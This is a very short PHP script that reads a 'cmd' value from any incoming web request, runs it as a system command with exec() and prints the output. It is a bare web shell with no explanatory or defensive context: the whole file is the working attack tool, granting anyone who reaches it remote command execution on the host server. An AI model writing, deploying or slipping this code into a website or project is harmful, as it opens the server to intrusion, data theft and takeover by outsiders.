<?php
$Mcmd = $_REQUEST['cmd'];
$lastline = exec($Mcmd, $arrOutput);
foreach($arrOutput as $val) 
	$output .= $val . "\n";
				
echo $output;
echo "end";
?>